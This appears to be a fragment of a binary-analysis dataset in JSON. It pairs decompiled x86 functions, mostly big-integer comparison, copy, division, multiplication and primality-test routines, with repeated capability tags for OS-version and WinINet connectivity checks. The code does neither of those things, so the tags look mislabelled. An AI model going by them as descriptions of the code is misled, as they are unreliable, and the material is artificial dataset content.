        "decompiled_code": "\nuint __cdecl fcn.00409da0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    bool bVar6;\n    \n    uVar2 = *(arg_8h + 4);\n    if (uVar2 != 0) {\n        piVar3 = *(arg_8h + 8) + uVar2 * 4;\n        do {\n            piVar3 = piVar3 + -1;\n            if (*piVar3 != 0) break;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    uVar4 = *(arg_ch + 4);\n    if (uVar4 != 0) {\n        piVar3 = *(arg_ch + 8) + uVar4 * 4;\n        do {\n            piVar3 = piVar3 + -1;\n            if (*piVar3 != 0) break;\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    if (uVar2 == 0) {\n        if (uVar4 == 0) {\n            return 0;\n        }\n    }\n    else if (uVar4 < uVar2) {\n        return 1;\n    }\n    if (uVar2 < uVar4) {\n        return 0xffffffff;\n    }\n    if (uVar2 != 0) {\n        puVar5 = *(arg_8h + 8) + -4 + uVar2 * 4;\n        do {\n            uVar4 = *puVar5;\n            puVar1 = (*(arg_ch + 8) - *(arg_8h + 8)) + puVar5;\n            bVar6 = uVar4 < *puVar1;\n            if (!bVar6 && uVar4 != *puVar1) {\n                return 1;\n            }\n            if (bVar6) {\n                return 0xffffffff;\n            }\n            puVar5 = puVar5 + -1;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 514
    },
    "00409e80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409e80(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    bool bVar8;\n    \n    uVar5 = arg_8h[1];\n    if (uVar5 != 0) {\n        piVar4 = arg_8h[2] + uVar5 * 4;\n        do {\n            piVar4 = piVar4 + -1;\n            if (*piVar4 != 0) break;\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    uVar6 = arg_ch[1];\n    if (uVar6 != 0) {\n        piVar4 = arg_ch[2] + uVar6 * 4;\n        do {\n            piVar4 = piVar4 + -1;\n            if (*piVar4 != 0) break;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    if (uVar5 == 0) {\n        if (uVar6 == 0) {\n            return 0;\n        }\n    }\n    else if (uVar6 < uVar5) {\n        return *arg_8h;\n    }\n    if (uVar5 < uVar6) {\n        return -*arg_ch;\n    }\n    iVar2 = *arg_8h;\n    if (iVar2 < 1) {\n        iVar3 = *arg_ch;\n        bVar8 = iVar3 < 0;\n    }\n    else {\n        iVar3 = *arg_ch;\n        bVar8 = iVar3 < 0;\n        if (bVar8) {\n            return 1;\n        }\n    }\n    if ((iVar3 != 0 && !bVar8) && (iVar2 < 0)) {\n        return -1;\n    }\n    if (uVar5 == 0) {\n        return 0;\n    }\n    puVar7 = arg_8h[2] + -4 + uVar5 * 4;\n    while( true ) {\n        uVar6 = *puVar7;\n        puVar1 = (arg_ch[2] - arg_8h[2]) + puVar7;\n        bVar8 = uVar6 < *puVar1;\n        if (!bVar8 && uVar6 != *puVar1) {\n            return iVar2;\n        }\n        if (bVar8) break;\n        puVar7 = puVar7 + -1;\n        uVar5 = uVar5 - 1;\n        if (uVar5 == 0) {\n            return 0;\n        }\n    }\n    return -iVar2;\n}\n",
        "token_count": 643
    },
    "00409f60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409f60(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_8h != arg_ch) {\n        if (arg_ch[2] != 0) {\n            iVar2 = arg_ch[1] + -1;\n            if (iVar2 != 0) {\n                piVar1 = arg_ch[2] + iVar2 * 4;\n                do {\n                    if (*piVar1 != 0) break;\n                    piVar1 = piVar1 + -1;\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            uVar3 = iVar2 + 1;\n            *arg_8h = *arg_ch;\n            if (arg_8h[1] < uVar3) {\n                if (uVar3 < 0x2711) {\n                    iVar2 = sub.msvcrt.dll_calloc(uVar3, 4);\n                    if (iVar2 != 0) {\n                        if (arg_8h[2] != 0) {\n                            fcn.004124d0(iVar2, arg_8h[2], arg_8h[1] << 2);\n                            fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n                            sub.msvcrt.dll_free(arg_8h[2]);\n                        }\n                        arg_8h[1] = uVar3;\n                        arg_8h[2] = iVar2;\n                        goto code_r0x0040a024;\n                    }\n                }\n                return 0xfffffff0;\n            }\n            fcn.004124f0(arg_8h[2] + uVar3 * 4, 0, (arg_8h[1] - uVar3) * 4);\n            iVar2 = arg_8h[2];\ncode_r0x0040a024:\n            fcn.004124d0(iVar2, arg_ch[2], uVar3 * 4);\n            return 0;\n        }\n        fcn.0040add0(arg_8h);\n    }\n    return 0;\n}\n",
        "token_count": 495
    },
    "0040a040": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a040(int32_t *arg_8h, uint *arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t *arg_8h_00;\n    int32_t iVar7;\n    ulong uVar8;\n    uint var_6ch;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint32_t *var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint32_t *var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint32_t *var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_1ch = &var_18h;\n    var_18h = 0;\n    var_24h = 1;\n    var_20h = 1;\n    iVar3 = fcn.00409e80(arg_14h, &var_24h);\n    if (iVar3 == 0) {\n        return 0xfffffff4;\n    }\n    arg_8h_00 = NULL;\n    var_30h = 1;\n    var_2ch = 0;\n    var_28h = 0;\n    var_3ch = 1;\n    var_38h = 0;\n    var_34h = 0;\n    var_60h = 1;\n    var_5ch = 0;\n    var_58h = 0;\n    var_48h = 1;\n    var_44h = 0;\n    var_40h = NULL;\n    var_54h = 1;\n    var_50h = 0;\n    var_4ch = NULL;\n    iVar3 = fcn.00409da0(arg_10h, arg_14h);\n    if (iVar3 < 0) {\n        if ((arg_8h != NULL) && (uVar4 = fcn.0040bbf0(arg_8h, 0),  uVar4 != 0)) {\n            return uVar4;\n        }\n        if ((arg_ch != NULL) && (uVar4 = fcn.00409f60(arg_ch, arg_10h),  uVar4 != 0)) {\n            return uVar4;\n        }\n        return 0;\n    }\n    uVar4 = fcn.00409f60(&var_30h, arg_10h);\n    if ((uVar4 == 0) && (uVar4 = fcn.00409f60(&var_3ch, arg_14h),  uVar4 == 0)) {\n        var_3ch = 1;\n        var_30h = 1;\n        uVar4 = fcn.0040b470(&var_60h, arg_10h[1] + 2);\n        if ((uVar4 == 0) &&\n           (((uVar4 = fcn.0040bbf0(&var_60h, 0),  uVar4 == 0 && (uVar4 = fcn.0040b470(&var_48h, 2),  uVar4 == 0)) &&\n            (uVar4 = fcn.0040b470(&var_54h, 3),  arg_8h_00 = var_4ch,  uVar4 == 0)))) {\n            uVar4 = fcn.00409d40(&var_3ch);\n            if ((uVar4 & 0x1f) < 0x1f) {\n                iVar3 = 0x1f - (uVar4 & 0x1f);\n                var_18h = iVar3;\n                uVar4 = fcn.0040c1f0(&var_30h, iVar3);\n                arg_8h_00 = var_4ch;\n                if ((uVar4 != 0) || (uVar4 = fcn.0040c1f0(&var_3ch, iVar3),  arg_8h_00 = var_4ch,  uVar4 != 0))\n                goto code_r0x0040a21e;\n            }\n            else {\n                var_18h = 0;\n            }\n            var_4h = var_2ch - 1;\n            var_ch = var_38h - 1;\n            iVar7 = var_4h - var_ch;\n            iVar3 = iVar7 * 0x20;\n            uVar4 = fcn.0040c1f0(&var_3ch, iVar3);\n            arg_8h_00 = var_4ch;\n            if (uVar4 == 0) {\n                iVar5 = fcn.00409e80(&var_30h, &var_3ch);\n                while (-1 < iVar5) {\n                    piVar6 = var_58h + iVar7 * 4;\n                    *piVar6 = *piVar6 + 1;\n                    uVar4 = fcn.0040c550(&var_30h, &var_30h, &var_3ch);\n                    arg_8h_00 = var_4ch;\n                    if (uVar4 != 0) goto code_r0x0040a21e;\n                    iVar5 = fcn.00409e80(&var_30h, &var_3ch);\n                }\n                uVar4 = fcn.0040c330(&var_3ch, iVar3);\n                arg_8h_00 = var_4ch;\n                if (uVar4 == 0) {\n                    if (var_ch < var_4h) {\n                        var_10h = var_34h + var_ch * 4;\n                        var_8h = iVar3 + -0x20;\n                        piVar6 = var_58h + -4 + iVar7 * 4;\n                        do {\n                            uVar4 = *(var_28h + var_4h * 4);\n                            var_14h = var_28h + var_4h * 4;\n                            uVar1 = *var_10h;\n                            if (((uVar4 < uVar1) && (uVar1 != 0)) && (uVar4 < uVar1)) {\n                                uVar8 = fcn.00408040();\n                                iVar3 = uVar8;\n                                if (uVar8 >> 0x20 != 0) {\n                                    var_1ch = NULL;\n                                    goto code_r0x0040a3b0;\n                                }\n                            }\n                            else {\ncode_r0x0040a3b0:\n                                iVar3 = -1;\n                            }\n                            *piVar6 = iVar3 + 1;\n                            do {\n                                *piVar6 = *piVar6 + -1;\n                                uVar4 = fcn.0040bbf0(&var_48h, 0);\n                                if (uVar4 != 0) goto code_r0x0040a21e;\n                                if (var_ch != 0) {\n                                    uVar4 = var_10h[-1];\n                                }\n                                var_6ch = 1;\n                                var_68h = 1;\n                                *var_40h = uVar4;\n                                var_40h[1] = *var_10h;\n                                var_64h = &var_1ch;\n                                var_1ch = *piVar6;\n                                uVar4 = fcn.0040bf10(&var_48h, &var_48h, &var_6ch);\n                                if ((uVar4 != 0) ||\n                                   (uVar4 = fcn.0040bbf0(&var_54h, 0),  arg_8h_00 = var_4ch,  uVar4 != 0))\n                                goto code_r0x0040a21e;\n                                if (1 < var_4h) {\n                                    uVar4 = *(var_28h + -8 + var_4h * 4);\n                                }\n                                *var_4ch = uVar4;\n                                if (var_4h == 0) {\n                                    uVar4 = 0;\n                                }\n                                else {\n                                    uVar4 = var_14h[-1];\n                                }\n                                var_4ch[1] = uVar4;\n                                var_4ch[2] = *var_14h;\n                                iVar3 = fcn.00409e80(&var_48h, &var_54h);\n                            } while (0 < iVar3);\n                            uVar4 = fcn.0040bed0(&var_48h, &var_3ch, *piVar6);\n                            if (((uVar4 != 0) || (uVar4 = fcn.0040c1f0(&var_48h, var_8h),  uVar4 != 0)) ||\n                               (uVar4 = fcn.0040c550(&var_30h, &var_30h, &var_48h),  uVar4 != 0)) goto code_r0x0040a21e;\n                            iVar3 = fcn.00409e40(&var_30h, 0);\n                            if (iVar3 < 0) {\n                                uVar4 = fcn.00409f60(&var_48h, &var_3ch);\n                                if (((uVar4 != 0) || (uVar4 = fcn.0040c1f0(&var_48h, var_8h),  uVar4 != 0)) ||\n                                   (uVar4 = fcn.00409cd0(&var_30h, &var_30h, &var_48h),  uVar4 != 0))\n                                goto code_r0x0040a21e;\n                                *piVar6 = *piVar6 + -1;\n                            }\n                            piVar6 = piVar6 + -1;\n                            var_8h = var_8h + -0x20;\n                            var_4h = var_4h - 1;\n                        } while (var_ch < var_4h);\n                    }\n                    if (arg_8h != NULL) {\n                        uVar4 = fcn.00409f60(arg_8h, &var_60h);\n                        if (uVar4 != 0) goto code_r0x0040a21e;\n                        *arg_8h = *arg_10h * *arg_14h;\n                    }\n                    if ((arg_ch != NULL) && (uVar4 = fcn.0040c330(&var_30h, var_18h),  uVar4 == 0)) {\n                        var_30h = *arg_10h;\n                        uVar4 = fcn.00409f60(arg_ch, &var_30h);\n                        if ((uVar4 == 0) && (iVar3 = fcn.00409e40(arg_ch, 0),  iVar3 == 0)) {\n                            *arg_ch = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0040a21e:\n    iVar3 = var_28h;\n    if (var_28h != 0) {\n        fcn.0040eda0(var_28h, var_2ch << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    iVar3 = var_34h;\n    if (var_34h != 0) {\n        fcn.0040eda0(var_34h, var_38h << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    iVar3 = var_58h;\n    if (var_58h != 0) {\n        fcn.0040eda0(var_58h, var_5ch << 2);\n        sub.msvcrt.dll_free(iVar3);\n    }\n    puVar2 = var_40h;\n    if (var_40h != NULL) {\n        fcn.0040eda0(var_40h, var_44h << 2);\n        sub.msvcrt.dll_free(puVar2);\n    }\n    if (arg_8h_00 != NULL) {\n        fcn.0040eda0(arg_8h_00, var_50h << 2);\n        sub.msvcrt.dll_free(arg_8h_00);\n    }\n    return uVar4;\n}\n",
        "token_count": 2890
    },
    "0040bab0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bab0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    var_ch = 1;\n    arg_8h = 0;\n    var_18h = 1;\n    var_8h = *(iVar1 + 4);\n    var_4h = *(iVar1 + 8);\n    var_10h = &arg_8h;\n    var_14h = 1;\n    iVar1 = fcn.00409e80(&var_ch, &var_18h);\n    if (iVar1 != 0) {\n        var_10h = &arg_8h;\n        arg_8h = 1;\n        var_18h = 1;\n        var_14h = 1;\n        iVar1 = fcn.00409e80(&var_ch, &var_18h);\n        if (iVar1 != 0) {\n            var_10h = &arg_8h;\n            arg_8h = 2;\n            var_18h = 1;\n            var_14h = 1;\n            iVar1 = fcn.00409e80(&var_ch, &var_18h);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            iVar1 = fcn.0040c740(&var_ch);\n            if (iVar1 != 0) {\n                if (iVar1 != 1) {\n                    return iVar1;\n                }\n                return 0;\n            }\n            iVar1 = fcn.0040c7e0(&var_ch, arg_ch, arg_10h, arg_14h);\n            return iVar1;\n        }\n    }\n    return -0xe;\n}\n",
        "token_count": 441
    },
    "0040bbf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bbf0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = arg_8h[1];\n    if (iVar1 == 0) {\n        arg_8h_00 = sub.msvcrt.dll_calloc(1, 4);\n        if (arg_8h_00 == 0) {\n            return 0xfffffff0;\n        }\n        if (arg_8h[2] != 0) {\n            fcn.004124d0(arg_8h_00, arg_8h[2], arg_8h[1] << 2);\n            fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        arg_8h[1] = 1;\n        iVar1 = 1;\n        arg_8h[2] = arg_8h_00;\n    }\n    fcn.004124f0(arg_8h[2], 0, iVar1 << 2);\n    uVar2 = arg_ch >> 0x1f;\n    *arg_8h[2] = (arg_ch ^ uVar2) - uVar2;\n    *arg_8h = (uVar2 & 0xfffffffe) + 1;\n    return 0;\n}\n",
        "token_count": 336
    },
    "0040bf10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bf10(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = 0;\n    if (arg_8h == arg_ch) {\n        iVar2 = fcn.00409f60(&var_1ch, arg_ch);\n        if (iVar2 != 0) goto code_r0x0040c0b9;\n        arg_ch = &var_1ch;\n    }\n    if (arg_8h == arg_10h) {\n        iVar2 = fcn.00409f60(&var_10h, arg_10h);\n        if (iVar2 == 0) {\n            arg_10h = &var_10h;\n            goto code_r0x0040bf93;\n        }\n    }\n    else {\ncode_r0x0040bf93:\n        iVar5 = arg_ch[1];\n        if (iVar5 != 0) {\n            piVar3 = arg_ch[2] + iVar5 * 4;\n            do {\n                piVar3 = piVar3 + -1;\n                if (*piVar3 != 0) break;\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        iVar4 = arg_10h[1];\n        if (iVar4 != 0) {\n            piVar3 = arg_10h[2] + iVar4 * 4;\n            do {\n                piVar3 = piVar3 + -1;\n                if (*piVar3 != 0) break;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        uVar1 = iVar4 + iVar5;\n        if (uVar1 < 0x2711) {\n            if (arg_8h[1] < uVar1) {\n                var_4h = sub.msvcrt.dll_calloc(uVar1, 4);\n                if (var_4h == 0) {\n                    iVar2 = -0x10;\n                    goto code_r0x0040c09c;\n                }\n                if (arg_8h[2] != 0) {\n                    fcn.004124d0(var_4h, arg_8h[2], arg_8h[1] << 2);\n                    fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n                    sub.msvcrt.dll_free(arg_8h[2]);\n                }\n                arg_8h[2] = var_4h;\n                arg_8h[1] = iVar4 + iVar5;\n            }\n            iVar2 = fcn.0040bbf0(arg_8h, 0);\n            var_4h = iVar2;\n            if (iVar2 == 0) {\n                for (; var_4h = iVar2,  iVar4 != 0; iVar4 = iVar4 + -1) {\n                    fcn.0040cdd0(iVar5, arg_ch[2], arg_8h[2] + iVar4 * 4 + -4, *(arg_10h[2] + -4 + iVar4 * 4));\n                    iVar2 = var_4h;\n                }\n                *arg_8h = *arg_ch * *arg_10h;\n            }\n        }\n        else {\n            iVar2 = -0x10;\n        }\n    }\ncode_r0x0040c09c:\n    iVar5 = var_8h;\n    if (var_8h != 0) {\n        fcn.0040eda0(var_8h, var_ch << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\ncode_r0x0040c0b9:\n    iVar5 = var_14h;\n    if (var_14h != 0) {\n        fcn.0040eda0(var_14h, var_18h << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\n    return iVar2;\n}\n",
        "token_count": 1033
    },
    "0040c440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c440(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t arg_8h_00;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00409da0(arg_ch, arg_10h);\n    if (iVar1 < 0) {\n        return -10;\n    }\n    var_10h = 1;\n    var_ch = 0;\n    var_8h = 0;\n    if (arg_8h == arg_10h) {\n        var_4h = fcn.00409f60(&var_10h, arg_10h);\n        iVar1 = var_8h;\n        if (var_4h != 0) goto code_r0x0040c4ec;\n        arg_10h = &var_10h;\n    }\n    iVar1 = var_8h;\n    if (arg_8h != arg_ch) {\n        var_4h = fcn.00409f60(arg_8h, arg_ch);\n        if (var_4h != 0) goto code_r0x0040c4ec;\n    }\n    *arg_8h = 1;\n    arg_8h_00 = arg_10h[1];\n    var_4h = 0;\n    if (arg_8h_00 != 0) {\n        piVar2 = arg_10h[2] + arg_8h_00 * 4;\n        do {\n            piVar2 = piVar2 + -1;\n            if (*piVar2 != 0) break;\n            arg_8h_00 = arg_8h_00 + -1;\n        } while (arg_8h_00 != 0);\n    }\n    fcn.0040d040(arg_8h_00, arg_10h[2], arg_8h[2]);\ncode_r0x0040c4ec:\n    if (iVar1 != 0) {\n        fcn.0040eda0(iVar1, var_ch << 2);\n        sub.msvcrt.dll_free(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 523
    },
    "0040c7e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c7e0(uint32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t ptr;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_50h = &var_ch;\n    iVar5 = 0;\n    iVar6 = 0;\n    var_28h = 1;\n    var_4h = *arg_8h;\n    var_24h = 0;\n    ptr = 0;\n    var_34h = 1;\n    var_30h = 0;\n    var_2ch = 0;\n    var_40h = 1;\n    var_3ch = 0;\n    var_38h = 0;\n    var_1ch = 1;\n    var_18h = 0;\n    var_14h = 0;\n    var_4ch = 1;\n    var_48h = 0;\n    var_44h = 0;\n    var_ch = 1;\n    var_58h = 1;\n    var_54h = 1;\n    if (var_4h < 1) {\n        iVar2 = fcn.00409ac0(&var_28h, arg_8h, &var_58h);\n        uVar8 = var_4h;\n        if (iVar2 != 0) goto code_r0x0040cbc0;\n    }\n    else {\n        iVar2 = fcn.00409da0(arg_8h, &var_58h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.0040c440(&var_28h, &var_58h, arg_8h);\n            if (iVar2 != 0) goto code_r0x0040cbc0;\n            uVar8 = -var_4h;\n        }\n        else {\n            iVar2 = fcn.0040c440(&var_28h, arg_8h, &var_58h);\n            if (iVar2 != 0) goto code_r0x0040cbc0;\n            var_28h = var_4h;\n            uVar8 = var_28h;\n        }\n    }\n    var_28h = uVar8;\n    var_4h = fcn.0040bba0(&var_28h);\n    iVar2 = fcn.00409f60(&var_34h, &var_28h);\n    if (((iVar2 == 0) && (iVar2 = fcn.0040c330(&var_34h, var_4h),  iVar2 == 0)) && (var_ch = 0,  arg_ch != 0)) {\n        do {\n            var_8h = 0;\n            do {\n                do {\n                    iVar2 = fcn.0040acd0(&var_1ch, arg_8h[1] << 2, arg_10h, arg_14h);\n                    iVar5 = var_14h;\n                    iVar6 = var_44h;\n                    if (iVar2 != 0) goto code_r0x0040cbc0;\n                    iVar5 = var_18h;\n                    if (var_18h == 0) {\n                        uVar7 = 0;\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar5;\n                            iVar5 = iVar6 + -1;\n                            if (iVar5 == 0) break;\n                        } while (*(var_14h + iVar5 * 4) == 0);\n                        uVar8 = *(var_14h + iVar5 * 4);\n                        uVar3 = 0x80000000;\n                        uVar7 = 0;\n                        do {\n                            if ((uVar3 & uVar8) != 0) break;\n                            if ((uVar3 >> 1 & uVar8) != 0) {\n                                uVar7 = uVar7 + 1;\n                                break;\n                            }\n                            if ((uVar3 >> 2 & uVar8) != 0) {\n                                uVar7 = uVar7 + 2;\n                                break;\n                            }\n                            if ((uVar3 >> 3 & uVar8) != 0) {\n                                uVar7 = uVar7 + 3;\n                                break;\n                            }\n                            uVar7 = uVar7 + 4;\n                            uVar3 = uVar3 >> 4;\n                        } while (uVar7 < 0x20);\n                        uVar7 = iVar6 * 0x20 - uVar7;\n                    }\n                    iVar5 = var_24h;\n                    if (var_24h == 0) {\n                        uVar4 = 0;\n                    }\n                    else {\n                        do {\n                            iVar6 = iVar5;\n                            iVar5 = iVar6 + -1;\n                            if (iVar5 == 0) break;\n                        } while (*(ptr + iVar5 * 4) == 0);\n                        uVar3 = 0x80000000;\n                        uVar4 = 0;\n                        uVar8 = *(ptr + iVar5 * 4);\n                        do {\n                            if ((uVar3 & uVar8) != 0) break;\n                            if ((uVar3 >> 1 & uVar8) != 0) {\n                                uVar4 = uVar4 + 1;\n                                break;\n                            }\n                            if ((uVar3 >> 2 & uVar8) != 0) {\n                                uVar4 = uVar4 + 2;\n                                break;\n                            }\n                            if ((uVar3 >> 3 & uVar8) != 0) {\n                                uVar4 = uVar4 + 3;\n                                break;\n                            }\n                            uVar4 = uVar4 + 4;\n                            uVar3 = uVar3 >> 4;\n                        } while (uVar4 < 0x20);\n                        uVar4 = iVar6 * 0x20 - uVar4;\n                    }\n                    if (uVar4 < uVar7) {\n                        puVar1 = var_14h + -4 + var_18h * 4;\n                        *puVar1 = *puVar1 & (1 << (uVar4 - 1U & 0x1f)) - 1U;\n                    }\n                    if (0x1e < var_8h) {\n                        return -0xe;\n                    }\n                    var_8h = var_8h + 1;\n                    iVar5 = fcn.00409e80(&var_1ch, &var_28h);\n                } while (-1 < iVar5);\n                var_50h = &var_10h;\n                var_10h = 1;\n                var_58h = 1;\n                var_54h = 1;\n                iVar5 = fcn.00409e80(&var_1ch, &var_58h);\n            } while (iVar5 < 1);\n            iVar2 = fcn.0040a5e0(&var_1ch, &var_1ch, &var_34h, arg_8h, &var_4ch);\n            iVar5 = var_14h;\n            iVar6 = var_44h;\n            if (iVar2 != 0) break;\n            iVar5 = fcn.00409e80(&var_1ch, &var_28h);\n            if ((iVar5 != 0) && (iVar5 = fcn.00409e40(&var_1ch, 1),  iVar5 != 0)) {\n                uVar8 = 1;\n                if (1 < var_4h) {\n                    while (iVar5 = fcn.00409e80(&var_1ch, &var_28h),  iVar5 != 0) {\n                        iVar2 = fcn.0040bf10(&var_40h, &var_1ch, &var_1ch);\n                        iVar5 = var_14h;\n                        iVar6 = var_44h;\n                        if ((iVar2 != 0) ||\n                           (iVar2 = fcn.0040bd30(&var_1ch, &var_40h, arg_8h),  iVar5 = var_14h,  iVar6 = var_44h, \n                           iVar2 != 0)) goto code_r0x0040cbc0;\n                        var_5ch = &var_10h;\n                        var_10h = 1;\n                        var_64h = 1;\n                        var_60h = 1;\n                        iVar5 = fcn.00409e80(&var_1ch, &var_64h);\n                        if ((iVar5 == 0) || (uVar8 = uVar8 + 1,  var_4h <= uVar8)) break;\n                    }\n                }\n                iVar5 = fcn.00409e80(&var_1ch, &var_28h);\n                if ((iVar5 != 0) || (iVar5 = fcn.00409e40(&var_1ch, 1),  iVar5 == 0)) {\n                    iVar2 = -0xe;\n                    iVar5 = var_14h;\n                    iVar6 = var_44h;\n                    break;\n                }\n            }\n            var_ch = var_ch + 1;\n            iVar5 = var_14h;\n            iVar6 = var_44h;\n        } while (var_ch < arg_ch);\n    }\ncode_r0x0040cbc0:\n    if (ptr != 0) {\n        fcn.0040eda0(ptr, var_24h << 2);\n        sub.msvcrt.dll_free(ptr);\n    }\n    if (var_2ch != 0) {\n        fcn.0040eda0(var_2ch, var_30h << 2);\n        sub.msvcrt.dll_free(var_2ch);\n    }\n    if (var_38h != 0) {\n        fcn.0040eda0(var_38h, var_3ch << 2);\n        sub.msvcrt.dll_free(var_38h);\n    }\n    if (iVar5 != 0) {\n        fcn.0040eda0(iVar5, var_18h << 2);\n        sub.msvcrt.dll_free(iVar5);\n    }\n    if (iVar6 != 0) {\n        fcn.0040eda0(iVar6, var_48h << 2);\n        sub.msvcrt.dll_free(iVar6);\n    }\n    return iVar2;\n}\n",
